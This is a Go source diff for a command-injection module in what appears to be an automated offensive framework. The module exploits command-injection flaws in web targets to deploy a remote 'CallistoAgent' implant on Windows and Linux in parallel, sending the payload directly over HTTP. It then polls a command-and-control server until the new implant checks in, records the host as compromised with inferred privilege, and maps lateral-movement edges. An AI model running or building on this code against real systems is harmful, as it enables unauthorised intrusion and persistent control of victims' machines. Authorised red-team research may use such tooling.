@@ -15,6 +15,7 @@ import (
 	"regexp"
 	"runtime/debug"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 )
@@ -127,11 +128,24 @@ func (c *CommandInjectionSpecialist) executeTask(cmdEvent bus.Event) {
 	c.reportVerifiedRCE(targetURL, payload, evidence)
 
 	log.Printf("[%s] Deploying CallistoAgent via Command Injection (both platforms)...\n", c.id)
+
+	// Get current agent list before deployment
+	agentsBefore, _ := c.trtClient.GetAliveAgents()
+	beforePAWs := make(map[string]bool)
+	for _, a := range agentsBefore {
+		beforePAWs[a.Paw] = true
+	}
+
 	results := c.deployAgentBothPlatforms(targetURL, actualParam, payloadType)
 
 	// Generate report
 	report := c.generateReportBothPlatforms(results)
 	c.reportObservation(cmdEvent.FromAgent, report)
+
+	// ============================================================================
+	// Poll TRT for new agent registration and report Compromised if found
+	// ============================================================================
+	go c.pollForNewAgent(targetURL, beforePAWs)
 }
 
 // DeploymentResult stores the result of a deployment attempt
@@ -150,24 +164,44 @@ const (
 	PayloadTypeChained  PayloadType = "chained"  // Chained with separator (e.g., host=localhost;id)
 )
 
-// deployAgentBothPlatforms deploys agent for both Windows and Linux via Command Injection
+// deployAgentBothPlatforms deploys agent for both Windows and Linux via Command Injection (PARALLEL)
 func (c *CommandInjectionSpecialist) deployAgentBothPlatforms(targetURL string, parameter string, payloadType PayloadType) []DeploymentResult {
-	results := make([]DeploymentResult, 0, 2)
+	results := make(chan DeploymentResult, 2)
+	var wg sync.WaitGroup
 
-	// Try Windows first
-	log.Printf("[%s] 🪟 Attempting Windows agent deployment via Command Injection...\n", c.id)
-	winResult := c.deployAgentViaRCE(targetURL, parameter, "windows", payloadType)
-	results = append(results, winResult)
+	// Deploy Windows and Linux in parallel
+	platforms := []string{"windows", "linux"}
+	for _, platform := range platforms {
+		wg.Add(1)
+		go func(p string) {
+			defer wg.Done()
+			if p == "windows" {
+				log.Printf("[%s] 🪟 Attempting Windows agent deployment via Command Injection...\n", c.id)
+			} else {
+				log.Printf("[%s] 🐧 Attempting Linux agent deployment via Command Injection...\n", c.id)
+			}
+			result := c.deployAgentViaRCE(targetURL, parameter, p, payloadType)
+			results <- result
+		}(platform)
+	}
 
-	// Try Linux second
-	log.Printf("[%s] 🐧 Attempting Linux agent deployment via Command Injection...\n", c.id)
-	linuxResult := c.deployAgentViaRCE(targetURL, parameter, "linux", payloadType)
-	results = append(results, linuxResult)
+	// Wait for both deployments to complete
+	go func() {
+		wg.Wait()
+		close(results)
+	}()
 
-	return results
+	// Collect results
+	var deployResults []DeploymentResult
+	for result := range results {
+		deployResults = append(deployResults, result)
+	}
+
+	return deployResults
 }
 
 // deployAgentViaRCE deploys CallistoAgent via Command Injection vulnerability
+// Uses Native HTTP Client to avoid URL encoding issues through TRT Remote Executor
 func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, parameter string, platform string, payloadType PayloadType) DeploymentResult {
 	result := DeploymentResult{
 		Platform: platform,
@@ -217,25 +251,22 @@ func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, paramet
 	log.Printf("[%s] Executing deployment via Command Injection...\n", c.id)
 	log.Printf("[%s] Payload: %s\n", c.id, payload)
 
-	// Execute via HTTP request through existing agent (TRT remote executor)
-	executor := trt.NewRemoteExecutor(c.trtClient, c.agentPaw, c.platform)
+	// ============================================================================
+	// Use Native HTTP Client to avoid URL encoding corruption via TRT Remote Executor
+	// The TRT executor uses Windows Agent's curl which mangles special characters
+	// ============================================================================
 
-	// Build test URL with payload
-	testURL, err := url.Parse(targetURL)
+	// Build the full URL with properly encoded payload
+	// We manually construct the URL to ensure correct encoding
+	fullURL := fmt.Sprintf("%s?%s=%s", targetURL, parameter, url.QueryEscape(payload))
+
+	log.Printf("[%s] Sending deployment request via Native HTTP Client\n", c.id)
+	log.Printf("[%s] Full URL: %s\n", c.id, fullURL)
+
+	// Execute HTTP request using Native Go HTTP Client (bypasses TRT Remote Executor)
+	response, err := tools.NativeHTTPGet(c.ctx, fullURL, "")
 	if err != nil {
-		log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
-		result.Error = fmt.Sprintf("URL parse failed: %v", err)
-		return result
-	}
-
-	queryParams := testURL.Query()
-	queryParams.Set(parameter, payload)
-	testURL.RawQuery = queryParams.Encode()
-
-	// Execute HTTP request
-	response, err := tools.SimpleHTTPGet(c.ctx, executor, testURL.String())
-	if err != nil {
-		log.Printf("[%s] HTTP request failed: %v\n", c.id, err)
+		log.Printf("[%s] Native HTTP request failed: %v\n", c.id, err)
 		result.Error = fmt.Sprintf("HTTP request failed: %v", err)
 		return result
 	}
@@ -443,8 +474,12 @@ func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter strin
 		log.Printf("[%s] Testing specific parameter '%s' first, then common names\n", c.id, parameter)
 	}
 
-	// Create executor (use TRT remote executor)
-	executor := trt.NewRemoteExecutor(c.trtClient, c.agentPaw, c.platform)
+	// ============================================================================
+	// Use NativeExecutor to avoid URL encoding issues via TRT Remote Executor
+	// This ensures proper handling of special characters in payloads
+	// ============================================================================
+	executor := tools.NewNativeExecutor()
+	log.Printf("[%s] Using NativeExecutor for RCE verification (bypasses TRT encoding issues)\n", c.id)
 
 	// Test each parameter name
 	for _, param := range paramsToTest {
@@ -572,4 +607,176 @@ func (c *CommandInjectionSpecialist) reportVerifiedRCE(targetURL string, payload
 	c.bus.Publish("Reporter-01", event)
 
 	log.Printf("[%s] ✅ Verified RCE: CommandInjection at %s\n", c.id, targetURL)
+}
+
+// pollForNewAgent waits for new agent registration and reports Compromised event
+func (c *CommandInjectionSpecialist) pollForNewAgent(targetURL string, beforePAWs map[string]bool) {
+	// Wait up to 30 seconds for new agent registration
+	maxAttempts := 15
+	pollInterval := 2 * time.Second
+
+	log.Printf("[%s] 🔍 Polling TRT for new agent registration...\n", c.id)
+
+	for attempt := 1; attempt <= maxAttempts; attempt++ {
+		time.Sleep(pollInterval)
+
+		agents, err := c.trtClient.GetAliveAgents()
+		if err != nil {
+			log.Printf("[%s] Error polling agents: %v\n", c.id, err)
+			continue
+		}
+
+		// Check for new agents
+		for _, agent := range agents {
+			if !beforePAWs[agent.Paw] {
+				// Found new agent!
+				log.Printf("[%s] 💀 NEW AGENT DETECTED: %s (Host: %s, Platform: %s, User: %s)\n",
+					c.id, agent.Paw, agent.Host, agent.Platform, "")
+
+				// Report Compromised event to Reporter
+				c.reportCompromised(targetURL, agent)
+				return
+			}
+		}
+
+		if attempt%5 == 0 {
+			log.Printf("[%s] Still waiting for new agent... (%d/%d)\n", c.id, attempt, maxAttempts)
+		}
+	}
+
+	log.Printf("[%s] ⚠️ No new agent detected after 30 seconds. Deployment may have failed.\n", c.id)
+}
+
+// reportCompromised publishes a Compromised event to Reporter and creates NetworkNode in TRT
+func (c *CommandInjectionSpecialist) reportCompromised(targetURL string, agent trt.Agent) {
+	// Use privilege from TRT if available, otherwise infer
+	privilege := agent.Privilege
+	if privilege == "" {
+		privilege = "User"
+		// Infer from username
+		lowerUser := strings.ToLower(agent.Username)
+		if strings.Contains(lowerUser, "root") ||
+			strings.Contains(lowerUser, "system") ||
+			strings.Contains(lowerUser, "admin") ||
+			strings.Contains(lowerUser, "nt authority") {
+			privilege = "Elevated"
+		}
+	}
+
+	// Use username from TRT if available, otherwise use host
+	username := agent.Username
+	if username == "" {
+		username = agent.Host
+	}
+
+	// ============================================================================
+	// Create NetworkNode in TRT for the compromised target
+	// Find source NetworkNode using the original agent's IP addresses
+	// ============================================================================
+	if c.trtClient != nil {
+		// Use agent's Host IP for NetworkNode
+		ipAddress := agent.Host
+		hostname := fmt.Sprintf("Compromised-%s", agent.Paw)
+		role := "COMPROMISED"
+
+		// Find source NetworkNode from the original agent's IP addresses
+		var sourceNodeID int
+		sourceAgent, err := c.getAgentByPaw(c.agentPaw)
+		if err == nil && sourceAgent != nil {
+			// Parse host_ip_addrs JSON array to find matching NetworkNode
+			sourceIPs := c.parseHostIPAddrs(sourceAgent.HostIPAddrs)
+			for _, sourceIP := range sourceIPs {
+				sourceNode, err := c.trtClient.GetNetworkNodeByIP(sourceIP)
+				if err == nil && sourceNode != nil {
+					sourceNodeID = sourceNode.ID
+					log.Printf("[%s] 🔗 Found source NetworkNode: ID=%d, IP=%s\n", c.id, sourceNode.ID, sourceIP)
+					break
+				}
+			}
+		}
+
+		// Create NetworkNode with sourceNodeID for edge creation
+		var node *trt.NetworkNode
+		if sourceNodeID > 0 {
+			node, err = c.trtClient.CreateNetworkNode(ipAddress, hostname, role, agent.Platform, true, sourceNodeID)
+		} else {
+			node, err = c.trtClient.CreateNetworkNode(ipAddress, hostname, role, agent.Platform, true)
+		}
+		if err != nil {
+			log.Printf("[%s] ⚠️ Failed to create NetworkNode for %s: %v\n", c.id, ipAddress, err)
+		} else {
+			log.Printf("[%s] 🌐 NetworkNode created: ID=%d, IP=%s, Role=%s, SourceNodeID=%d\n", c.id, node.ID, node.IPAddress, node.Role, sourceNodeID)
+		}
+	}
+
+	compromised := map[string]interface{}{
+		"url":       targetURL,
+		"agent_paw": agent.Paw,
+		"platform":  agent.Platform,
+		"host":      agent.Host,
+		"username":  username,
+		"privilege": privilege,
+		"timestamp": time.Now().Format(time.RFC1123),
+	}
+
+	msgID := cmdiMessageCounter.Add(1)
+	event := bus.Event{
+		ID:        fmt.Sprintf("%s-compromised-%d", c.id, msgID),
+		FromAgent: c.id,
+		ToAgent:   "Reporter-01",
+		Type:      bus.Compromised,
+		Payload:   compromised,
+	}
+	c.bus.Publish("Reporter-01", event)
+
+	log.Printf("[%s] 💀 COMPROMISED: Target %s now has active agent %s\n", c.id, targetURL, agent.Paw)
+}
+
+// getAgentByPaw retrieves an agent by its PAW identifier
+func (c *CommandInjectionSpecialist) getAgentByPaw(paw string) (*trt.Agent, error) {
+	if c.trtClient == nil {
+		return nil, fmt.Errorf("TRT client not available")
+	}
+
+	agents, err := c.trtClient.GetAliveAgents()
+	if err != nil {
+		return nil, err
+	}
+
+	for _, agent := range agents {
+		if agent.Paw == paw {
+			return &agent, nil
+		}
+	}
+
+	return nil, fmt.Errorf("agent not found: %s", paw)
+}
+
+// parseHostIPAddrs parses the JSON array string of host IP addresses
+// e.g., "[\"192.168.1.1\", \"10.0.0.1\"]" -> ["192.168.1.1", "10.0.0.1"]
+func (c *CommandInjectionSpecialist) parseHostIPAddrs(jsonStr string) []string {
+	if jsonStr == "" {
+		return nil
+	}
+
+	var ips []string
+	// Remove brackets and quotes, split by comma
+	jsonStr = strings.TrimPrefix(jsonStr, "[")
+	jsonStr = strings.TrimSuffix(jsonStr, "]")
+	jsonStr = strings.ReplaceAll(jsonStr, "\"", "")
+	jsonStr = strings.ReplaceAll(jsonStr, " ", "")
+
+	if jsonStr == "" {
+		return nil
+	}
+
+	parts := strings.Split(jsonStr, ",")
+	for _, part := range parts {
+		ip := strings.TrimSpace(part)
+		if ip != "" && ip != "UNKNOWN" {
+			ips = append(ips, ip)
+		}
+	}
+
+	return ips
 }
